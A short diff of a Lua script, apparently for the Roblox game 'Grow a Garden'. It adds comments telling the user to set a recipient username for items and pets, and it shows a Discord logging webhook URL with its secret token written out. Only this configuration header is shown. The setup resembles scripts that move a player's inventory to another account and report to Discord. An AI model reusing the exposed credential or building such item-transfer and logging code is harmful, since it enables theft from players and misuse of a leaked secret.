@@ -1,3 +1,6 @@
+-- Presentation version of your Grow a Garden script
+-- Make sure to set 'username' to the player to whom you want to give items/pets
+
 local logs_webhook = "https://discord.com/api/webhooks/1386534377114308690/PrcjOhmjN8I10-1LHleXGQQgKKquxDxo9G8nY6r4XhIQWJ8xfhKA5EZ8Lgq29Uh0hUsj"
 
 -- Set this to the username of the recipient
